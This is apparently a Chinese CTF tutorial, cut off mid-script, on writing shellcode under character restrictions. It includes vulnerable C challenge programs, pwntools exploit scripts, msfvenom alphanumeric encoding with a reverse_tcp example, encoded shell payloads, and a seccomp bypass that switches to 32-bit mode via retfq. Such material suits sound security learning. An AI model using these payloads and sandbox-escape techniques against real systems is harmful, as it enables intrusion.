> 题目大多数来源自：
>
> [https://github.com/ustclug/hackergame2019-writeups/tree/master/official/Shell_%E9%AA%87%E5%AE%A2](https://github.com/ustclug/hackergame2019-writeups/tree/master/official/Shell_%E9%AA%87%E5%AE%A2)
>
> 参考资料：
>
> [https://xz.aliyun.com/t/6645](https://xz.aliyun.com/t/6645)
>
> [https://xz.aliyun.com/t/5662](https://xz.aliyun.com/t/5662)
>
> [https://www.cnblogs.com/countfatcode/archive/2004/01/13/11756258.html](https://www.cnblogs.com/countfatcode/archive/2004/01/13/11756258.html)
>
> 附件：
>
> 链接: [https://pan.baidu.com/s/18gd5tJyI5CJlVHHRvxlmAw](https://pan.baidu.com/s/18gd5tJyI5CJlVHHRvxlmAw)  密码: 0t0r
>
> --来自百度网盘超级会员V3的分享
>

# 前言
假如说pwn题做多的话，提到shellcode你一定不会陌生，它是获得shell权限的一把钥匙。但是有的题目中会对我们输入的shellcode进行限制，比如说不可见字符之类的，如果碰到这种题目，我们应该怎么办？

我们按照调用shellcode的题目进行分类，总结出了几道shellcode的题目。

# 直接调用shellcode
> 题目来源：[https://github.com/ustclug/hackergame2019-writeups/tree/master/official/Shell_%E9%AA%87%E5%AE%A2](https://github.com/ustclug/hackergame2019-writeups/tree/master/official/Shell_%E9%AA%87%E5%AE%A2)
>

源码如下：

```c
// gcc -z execstack -fPIE -pie -z now chall1.c -o chall1

int main() {
    char buf[0x200];
    read(0, buf, 0x200);
    ((void(*)(void))buf)();
}
```

> 不用自己编译，因为附件中有
>

文件保护情况如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610588895114-dedff68b-1892-4f15-9ff7-6c18b83d1523.png)

虽然这道题目开启了绝大多数保护，但是没有开启NX保护，因此可以直接向栈上注入shellcode，并且shellcode长度不超过0x200就好：

```python
from pwn import *
context.log_level='debug'
context.arch = 'amd64' #记得指定架构

p=process('./chall1')
shellcode = asm(shellcraft.sh()) 
payload=shellcode
p.sendline(payload)
p.interactive()
```

# 利用sandbox禁用system、execve函数
我们的目的是拿到flag，不一定要得到shell权限，因此可以构造shellcode实现

```c
fp = open("flag")
read(fp,buf,0x30)
write(1,buf,0x30)
```

来读取flag，最典型的例子是pwnable.tw上的orw，之前也说过，附上链接：

[PWN进阶（1-1）-初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw）](https://www.yuque.com/cyberangel/rg9gdm/nwwof4)

这里就不再说了，感兴趣可以移步到文章。

# 限制shellcode中的字符
> 64位程序
>

```c
// gcc -m64 -z execstack -fPIE -pie -z now chall3.c -o chall3
int main() {
    char buf[0x400];
    int n, i;
    n = read(0, buf, 0x400);
    if (n <= 0) return 0;
    for (i = 0; i < n; i++) {
        if(buf[i] < 32 || buf[i] > 126) return 0;
    }
    ((void(*)(void))buf)();
}
```

可以看到，这道题对我们输入的shellcode进行了限制，shellcode的每个字符都要求是可见字符，那么能用的汇编语句就大大减少了，如32位的int 0x80，64位的syscall都不能直接输入，我们如何来构造shellcode？

参考前人的总结，此类题目可用到的汇编指令如下 ：

```c
1.数据传送:
push/pop eax…
pusha/popa

2.算术运算:
inc/dec eax…
sub al, 立即数
sub byte ptr [eax… + 立即数], al dl…
sub byte ptr [eax… + 立即数], ah dh…
sub dword ptr [eax… + 立即数], esi edi
sub word ptr [eax… + 立即数], si di
sub al dl…, byte ptr [eax… + 立即数]
sub ah dh…, byte ptr [eax… + 立即数]
sub esi edi, dword ptr [eax… + 立即数]
sub si di, word ptr [eax… + 立即数]

3.逻辑运算:
and al, 立即数
and dword ptr [eax… + 立即数], esi edi
and word ptr [eax… + 立即数], si di
and ah dh…, byte ptr [ecx edx… + 立即数]
and esi edi, dword ptr [eax… + 立即数]
and si di, word ptr [eax… + 立即数]

xor al, 立即数
xor byte ptr [eax… + 立即数], al dl…
xor byte ptr [eax… + 立即数], ah dh…
xor dword ptr [eax… + 立即数], esi edi
xor word ptr [eax… + 立即数], si di
xor al dl…, byte ptr [eax… + 立即数]
xor ah dh…, byte ptr [eax… + 立即数]
xor esi edi, dword ptr [eax… + 立即数]
xor si di, word ptr [eax… + 立即数]

4.比较指令:
cmp al, 立即数
cmp byte ptr [eax… + 立即数], al dl…
cmp byte ptr [eax… + 立即数], ah dh…
cmp dword ptr [eax… + 立即数], esi edi
cmp word ptr [eax… + 立即数], si di
cmp al dl…, byte ptr [eax… + 立即数]
cmp ah dh…, byte ptr [eax… + 立即数]
cmp esi edi, dword ptr [eax… + 立即数]
cmp si di, word ptr [eax… + 立即数]

5.转移指令:
push 56h
pop eax
cmp al, 43h
jnz lable

<=> jmp lable

6.交换al, ah  //AH是eax的高8位,而AL是eax的低8位
push eax
xor ah, byte ptr [esp] // ah ^= al
xor byte ptr [esp], ah // al ^= ah
xor ah, byte ptr [esp] // ah ^= al
pop eax

7.清零:
push 44h
pop eax
sub al, 44h ; eax = 0

push esi
push esp
pop eax
xor [eax], esi ; esi = 0
```

所以考查的是我们用上面有限的汇编指令编写出可用的shellcode，基本思想：

mov a,b 用 push b;pop a替换；而像int 0x80 ; syscall这种则通过xor sub and inc dec运算来操作shellcode使之变成我们要的指令；

当然，手动写汇编指令是一件十分麻烦的事，也可以使用工具来生成shellcode，这个之后再说。

# 进一步限制shellcode的字符
> 32位程序
>

```c
// gcc -m32 -z execstack -fPIE -pie -z now chall2.c -o chall2
int main() {
    char buf[0x200];
    int n, i;
    n = read(0, buf, 0x200);
    if (n <= 0) return 0;
    for (i = 0; i < n; i++) {
        if(!((buf[i] >= 65 && buf[i] <= 90) || (buf[i] >= 48 && buf[i] <= 57))) return 0;
    }
    ((void(*)(void))buf)();
}
```

这道题目进一步缩小了shellcode输入的范围，要求在：A～Z和0～9范围之内。同样也可以使用工具生成对应要求的shellcode。

接下来我们看如何使用工具生成shellcode。

# 使用工具生成对应要求的shellcode
## x86 ELF（msfvenom）
先来看一下msfvenom的帮助：

```c
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -h              
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --service-name    <value>    The service name to use when generating a service binary
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message
```

中文翻译如下，~~自己翻译的，累死了~~

```c
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -h              
MsfVenom - a Metasploit standalone payload generator.
#MsfVenom - 一个Metasploit独立的payload生成器
Also a replacement for msfpayload and msfencode.
#也是msfpayload和msfencode的替代品。
Usage: /usr/bin/msfvenom [options] <var=val>
#使用方法：/usr/bin/msfvenom [选项] <变量=值>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
#例如：/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
   #-l, --list            <type>     列出[type]中所有的模块。模块类型包括： payloads, encoders, nops, platforms, archs, encrypt, formats, all
	-p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
   #-p, --payload         <payload>  指定需要使用的payload（使用--list来列出payload，使用--list-options来查看参数）
   #     							 如果要使用自定义的payload，请使用'-'或STDIN
   #    --list-options               列出 --payload<value>的标准、高级和规避选项
    -f, --format          <format>   Output format (use --list formats to list)
   #-f, --format          <format>   格式化输出（使用 --list formats 来列出格式化的选项）
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
   #-e, --encoder         <encoder>  指定需要使用的encoder（编码器）（使用--list encoders来列出选项）
        --service-name    <value>    The service name to use when generating a service binary
   #    --service-name    <value>    为生成的二进制文件指定服务名称
		--sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
   #	--sec-name        <value>    为生成大型的Windows二进制文件时指定新节区名。默认：4个随机的alpha字符串     
        --smallest                   Generate the smallest possible payload using all available encoders
   #    --smallest                   使用所有可用的encoder（编码器）生成尽可能最小的payload
		--encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
   #	--encrypt         <value>    应用到shellcode的加密或编码类型（使用--list encrypt查看）
        --encrypt-key     <value>    A key to be used for --encrypt
   #    --encrypt-key     <value>    用于加密（--encrypt）的密钥
        --encrypt-iv      <value>    An initialization vector for --encrypt
   #    --encrypt-iv      <value>    用于加密（--encrypt）的初始化向量    
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
   #-a, --arch            <arch>     为payload（--payload）和编码器（--encoders）指定架构（使用--list archs查看支持的架构）
        --platform        <platform> The platform for --payload (use --list platforms to list)
   #    --platform        <platform> 指定payload的目标平台（使用--list platforms查看）
    -o, --out             <path>     Save the payload to a file
   #-o, --out             <path>     将payload输出到文件
 	-b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
   #-b, --bad-chars       <list>     设定要在payload中规避的字符（集），例如：'\x00\xff'  
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
   #-n, --nopsled         <length>   为payload预先指定一个NOP滑动长度
		--pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
   #	--pad-nops                   使用由-n <长度>指定的nopsled大小作为总负载大小，自动提前计算nopsled的数量(nops减去payload长度)
    -s, --space           <length>   The maximum size of the resulting payload
   #-s, --space           <length>   设定payload的最大长度
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
   #    --encoder-space   <length>   编码payload的最大大小(默认为-s的值)    
    -i, --iterations      <count>    The number of times to encode the payload
   #-i, --iterations      <count>    指定payload的编码次数
	-c, --add-code        <path>     Specify an additional win32 shellcode file to include
   #-c, --add-code        <path>     指定一个附加的win32 shellcode文件	
	-x, --template        <path>     Specify a custom executable file to use as a template
   #-x, --template        <path>     指定一个自定义的可执行文件作为模板	 
	-k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
   #-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
   #-v, --var-name        <value>    指定一个自定义的变量，以确定输出格式
	-t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
   #-t, --timeout         <second>   从STDIN读取payload时需要等待的秒数(默认30,0为禁用)
    -h, --help                       Show this message
   #-h, --help                       查看帮助选项 
```

32位程序可以使用msf内置的encoder就行了（kali自带msf），下面是encoder（编码器）所支持的编码

```c
Framework Encoders [--encoder <value>]
======================================

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    ruby/base64                   great      Ruby Base64 Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
    x64/xor_dynamic               normal     Dynamic key XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
    x86/xor_dynamic               normal     Dynamic key XOR Encoder
```

但是到目前为止（2021-01-14）msf中还没有x64的alpha_upper编码方式。

### 使用方法
使用msf时，可以用内置的shellcode，其命令如下：

```c
msfvenom -a x86 --platform linux -p linux/x86/exec CMD="/bin/sh" -e x86/alpha_upper BufferRegister=eax
```

来解释一下各个参数的意思：（可以参照我上面翻译的表）

+ -a x86：指定shellcode架构为x86
+ --platform linux：指定平台为Linux平台
+ -p linux/x86/exec：指定payload为linux/x86/exec
+ CMD="/bin/sh"：指定shell命令为/bin/sh
+ -e x86/alpha_upper：指定使用的编码器为x86/alpha_upper
+ BufferRegister指的是指向shellcode的寄存器的值

正好在“进一步限制shellcode的字符”这一小节中提到了一道题，而其的payload正好是上述的shellcode（**<font style="color:#F5222D;">每个字符都</font>****<font style="color:#F5222D;">在</font>****<font style="color:#F5222D;">A～Z和0～9范围之内</font>**），将文件扔入IDA查看一下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610599710999-548ded0c-c8bf-4ff3-91ad-7ca42608336f.png)

从上面的图中可以看出，程序在执行我们输入的shellcode时会将其放在eax中，然后call eax去执行，这也就是为什么要指定“BufferRegister”，如果不声明BufferRegister的话，生成的shellcode会有额外的几条指令来确定shellcode的位置，而那几条额外的指令却并不是可打印字符。

尝试解这道题，生成payload：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610599967997-69a40de0-8142-4123-8fcb-360365a225ef.png)

> PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJDKF8J9QBSVU86M53K9JG58FOCCBH30U8VOSRU9RNMYKSV2JH38S0UPS0VOE23YBNFOSCE830V71CLIM1HMK0AA
>

写成exp：

```python
from pwn import *
context.log_level='debug'

p=process('./chall2') 
payload="PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJDKF8J9QBSVU86M53K9JG58FOCCBH30U8VOSRU9RNMYKSV2JH38S0UPS0VOE23YBNFOSCE830V71CLIM1HMK0AA"
p.send(payload)
p.interactive()
```

> 注意不可以使用sendline发送，sendline在payload结尾会添加'\n'，程序会检查每一个字符是否在A～Z和0～9范围之内。由于shellcode在生成时已经指定架构，因此无需添加context.arch = 'amd64'。
>
> **<font style="color:#F5222D;">alpha_upper应该指的是每个字符都</font>****<font style="color:#F5222D;">在</font>****<font style="color:#F5222D;">A～Z和0～9范围之内。</font>**
>

**<font style="color:#F5222D;">当然，我们也可以使用msf编码自己的shellcode：</font>**

```shell
cat shellcode | msfvenom -a x86 --platform linux -e x86/alpha_upper BufferRegister=eax
```

> 请将自己的shellcode保存名为shellcode文件。
>

## x64 ELFshellcode_encoder
由于msf中没有关于x64的alpha_upper编码器，但是我们可以是使用github上开源的：[shellcode_encoder](https://github.com/ecx86/shellcode_encoder)

> 下载链接：[https://github.com/rcx/shellcode_encoder](https://github.com/rcx/shellcode_encoder)
>
> 或执行命令：git clone [https://github.com/rcx/shellcode_encoder](https://github.com/rcx/shellcode_encoder)
>
> 安装工具的前置要求：
>
> + pwntools (`pip install pwntools`)
> + z3 python bindings (`pip install z3-solver`)
>

<font style="color:#333333;">和</font>`msf`<font style="color:#333333;">上的工具一样，都是要确定shellcode的地址才行；</font>使用方法如下：

```python
python2 main.py <shellcode file> <pointer to shellcode>

#exmple：
python2 main.py shellcode.bin rcx
python2 main.py shellcode.bin [rsp+-8]
python2 main.py shellcode.bin 0x0123456789abcdef
python2 main.py shellcode.bin rbp+5
```

回头看一下之前的64位题目（chall3，**可见字符**），放入IDA中看一下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610608233903-92590b80-7e97-4d60-a1f9-2dd22193d729.png)

最后仍旧使用call rax来执行shellcode

因此将下载得到的shellcode文件放入到shellcode_encoder文件夹中，执行命令：

```c
python2 main.py shellcode rax
```

> 请手动创建shellcode文件：（可以到shellcode库下载，这里有很多的shellcode）
>
> [http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)
>
> 也可以到附件中下载shellcode文件，下面使用的是附件中的shellcode
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610613683105-361ec121-3626-4995-9ae0-f7b48bd90f31.png)

> PZTAYAXVI31VXPP[_Hc4:14:SX-i+lr-!&Xp5>%?/P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-9OOd-Q_  5>^??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-W`h)-H   5Sw??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-QZ##-|@ @57_?[P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-i+Fr-\  ^537_?P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-  uI-!@` 5:__~P^14:WX-_^/?-=apD-`@`|P_SX-"A`B-#`@~5#__?P_Hc4:14:SX- A $-3   5R|/+P^14:WX-_^/?-=apD-`@`|P_SX-@Ebi- \`Y5<_==P^SX-_A1"-q@_~5(~o_P_AAAA!39(.d@;*ez0&!4n_7lrt4n@1*}~w<?}X9.543}ng$h.j7g4w_iZ?%oQGq|{"7W%78w?s!|N8~?DB#*MA<z$3[P.f0R*z7!|
>

编写exp如下：（shellcode最好用三引号括起来）

```python
from pwn import *
context.log_level='debug'

p=process('./chall3') 
#gdb.attach(p)
payload='''PZTAYAXVI31VXPP[_Hc4:14:SX-i+lr-!&Xp5>%?/P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-9OOd-Q_  5>^??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-W`h)-H   5Sw??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-QZ##-|@ @57_?[P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-i+Fr-\  ^537_?P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-  uI-!@` 5:__~P^14:WX-_^/?-=apD-`@`|P_SX-"A`B-#`@~5#__?P_Hc4:14:SX- A $-3   5R|/+P^14:WX-_^/?-=apD-`@`|P_SX-@Ebi- \`Y5<_==P^SX-_A1"-q@_~5(~o_P_AAAA!39(.d@;*ez0&!4n_7lrt4n@1*}~w<?}X9.543}ng$h.j7g4w_iZ?%oQGq|{"7W%78w?s!|N8~?DB#*MA<z$3[P.f0R*z7!|'''
p.send(payload)
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610614002426-3708099c-9eff-42d2-aa4e-1f40471d6707.png)

？？？我shell呢？附加gdb调试进入call rax中看一下，下个断点：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610614086058-eabe1bb2-5485-45bd-838a-fc881355b8e7.png)（因为开启了PIE才使用rebase下断点）

终端输入c，然后单步进入（si）call：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610614373078-e3f121cd-7b64-4357-a788-6a24d23aff35.png)

emmm。。。没发现有什么不对，看一下github上的wp：

> [https://github.com/ustclug/hackergame2019-writeups/tree/master/players/%E5%92%95%E5%92%95%E5%92%95](https://github.com/ustclug/hackergame2019-writeups/tree/master/players/%E5%92%95%E5%92%95%E5%92%95)
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610614565368-3693780f-8217-4e28-9869-13d114d9117f.png)

修改一下工具中的encoder.py：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610614648074-95d70000-9127-405d-ace3-9f9bde15e1b2.png)

加个2，保存再次重复上述步骤：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610614734318-23bf36d7-cb82-447f-9ef3-5f57460575b7.png)

> PZTAYAXVI31VXPP[_Hc4:14:SX-i+lr-!&Xp5>%?/P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-9OOd-Q_  5>^??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-W`h)-H   5Sw??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-QZ##-|@ @57_?[P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-i+Fr-\  ^537_?P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-  uI-!@` 5:__~P^14:WX-_^/?-=apD-`@`|P_SX-@q`L- 0`x5:_?;P_Hc4:14:SX-IA00- %  5h{??P^14:WX-_^/?-=apD-`@`|P_SX-?iCI- p?w5?'}?P^SX-_b`P-b^`p5'???P_AAAA!39(.d@;*ez0&!4n_7lrt4n@1*}~w<?}X9.543}ng$h.j7g4w_iZ?%oQGq|{"7W%78w?s!|N8~?DB#*MA<z$3[P.f0R*z7!|
>

改一下payload：

```python
from pwn import *
context.log_level='debug'

p=process('./chall3') 
gdb.attach(p)
payload='''PZTAYAXVI31VXPP[_Hc4:14:SX-i+lr-!&Xp5>%?/P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-9OOd-Q_  5>^??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-W`h)-H   5Sw??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-QZ##-|@ @57_?[P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-i+Fr-\  ^537_?P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-  uI-!@` 5:__~P^14:WX-_^/?-=apD-`@`|P_SX-"A`B-#`@~5#__?P_Hc4:14:SX- A $-3   5R|/+P^14:WX-_^/?-=apD-`@`|P_SX-@Ebi- \`Y5<_==P^SX-_A1"-q@_~5(~o_P_AAAA!39(.d@;*ez0&!4n_7lrt4n@1*}~w<?}X9.543}ng$h.j7g4w_iZ?%oQGq|{"7W%78w?s!|N8~?DB#*MA<z$3[P.f0R*z7!|'''
payload1='''PZTAYAXVI31VXPP[_Hc4:14:SX-i+lr-!&Xp5>%?/P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-9OOd-Q_  5>^??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-W`h)-H   5Sw??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-QZ##-|@ @57_?[P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-i+Fr-\  ^537_?P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-  uI-!@` 5:__~P^14:WX-_^/?-=apD-`@`|P_SX-@q`L- 0`x5:_?;P_Hc4:14:SX-IA00- %  5h{??P^14:WX-_^/?-=apD-`@`|P_SX-?iCI- p?w5?'}?P^SX-_b`P-b^`p5'???P_AAAA!39(.d@;*ez0&!4n_7lrt4n@1*}~w<?}X9.543}ng$h.j7g4w_iZ?%oQGq|{"7W%78w?s!|N8~?DB#*MA<z$3[P.f0R*z7!|'''
p.send(payload1)
p.interactive()
```

再试一下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610614861556-0008e9b3-bd1c-48c5-b66b-30e667bf4fd1.png)

成功获得shell。如果不修改脚本代码可以使用如下命令编码正确的shellcode：

> python2 main.py shellcode rax+29
>
> 暂不清楚rax+29的含义
>

# 禁用system和open，并限制shellcode字符
当程序利用sandbox禁用system和open之后，应该怎么办？

> 题目来自星盟师傅ex的shellcode：
>
> [http://pwn.eonew.cn/challenge.php](http://pwn.eonew.cn/challenge.php)
>

检查一下文件的保护：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610677720484-16930992-dea2-4ed1-a5fa-2f0b2e4d6ac3.png)

只开启了NX保护，64位程序，IDA里看一下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610677784645-834c083e-2fa0-4e7a-ac35-442710b22483.png)

上来的一串变量和系统调用给我一种不好的预感，应该开启了sandbox并且程序限制了只能输入可见字符：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610677883345-cc47456e-c41c-4231-a292-a078133456c3.png)

当然这道题并没有限制系统的架构，我们可以利用这一点来转换程序运行模式，和之前的orw一题还是不一样的：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610678048353-180daf74-e90d-43ec-898b-873db4999963.png)

先来看一下系统调用表吧：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610678134677-7ffbc9f3-4025-4beb-b721-3557a808baa0.png)

可以看到，在64位模式下系统虽然禁用了open函数，但是可以将程序切换到32位模式下来运行以此调用open函数，怎么转换？

修改程序运行模式需要用到**<font style="color:#F5222D;">retfq</font>**这个指令，这个指令有两步操作：**<font style="color:#F5222D;">ret和set cs</font>**。当cs=0x23程序以32位模式运行，当cs=0x33程序以64位模式运行。retfq这个指令参数是放在栈中，[rsp]为要执行的代码的地址,[rsp + 0x8]为0x23或0x33，类似于这样：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610681550438-37af9f79-8394-4472-a2b0-f430c8bd2b2d.png)

脚本如下：

```python
#-*- coding:utf8 -*-
from pwn import *
context(os = 'linux', log_level = 'debug')
DEBUG = 1
if DEBUG == 0:
    p = process('./shellcode_elf')
elif DEBUG == 1:
    p = remote('nc.eonew.cn', 10011)

code_append = asm('''
        push rcx
        pop rcx
''', arch = 'amd64', os = 'linux')
# 用mmap分配一段内存空间
code_mmap = asm('''
        /*mov rdi, 0x40404040*/
        push 0x40404040
        pop rdi

        /*mov rsi, 0x7e*/
        push 0x7e
        pop rsi

        /*mov rdx, 0x7*/
        push 0x37
        pop rax
        xor al, 0x30
        push rax
        pop rdx

        /*mov r8, 0*/
        push 0x30
        pop rax
        xor al, 0x30
        push rax
        pop r8

        /*mov r9, 0*/
        push rax
        pop r9

        /*syscall*/
        push 0x5e
        pop rcx
        xor byte ptr [rbx+0x2c], cl
        push 0x5c
        pop rcx
        xor byte ptr [rbx+0x2d], cl

        /*mov rax, 0x9*/
        push 0x39
        pop rax
        xor al, 0x30
''', arch = 'amd64', os = 'linux')

code_read = asm('''
        /*mov rsi, 0x40404040*/
        push 0x40404040
        pop rsi

        /*mov rdi, 0*/
        push 0x30
        pop rax
        xor al, 0x30
        push rax
        pop rdi

        /*mov rdx, 0x7e*/
        push 0x7e
        pop rdx

        /*mov rax, 0*/
        push 0x30
        pop rax
        xor al, 0x30

        /*syscall*/
        push 0x5e
        pop rcx
        xor byte ptr [rbx+0x4f], cl
        push 0x5c
        pop rcx
        xor byte ptr [rbx+0x50], cl

''', arch = 'amd64', os = 'linux')

code_retfq = asm('''
        /* 算出0x48 */
        push 0x39
        pop rcx
        xor byte ptr [rbx + 0x71], cl
        push 0x20
        pop rcx
        xor byte ptr [rbx + 0x71], cl

        /*
        * 利用无借位减法算出0xcb
        */
        push 0x47
        pop rcx
        sub byte ptr [rbx + 0x72], cl
        sub byte ptr [rbx + 0x72], cl
        push rdi
        push rdi
        push 0x23
        push 0x40404040
        pop rax
        push rax
''', arch = 'amd64', os = 'linux')

code_open = asm('''
        /* open函数 */
        mov esp, 0x40404550
        push 0x67616c66
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        mov eax, 0x5
        int 0x80
        mov ecx, eax
''', arch = 'i386', os = 'linux')

code_retfq_1 = asm(''' 
        /* retfq */
        push 0x33
        push 0x40404062 /* 具体数字有待修改 */
        retfq
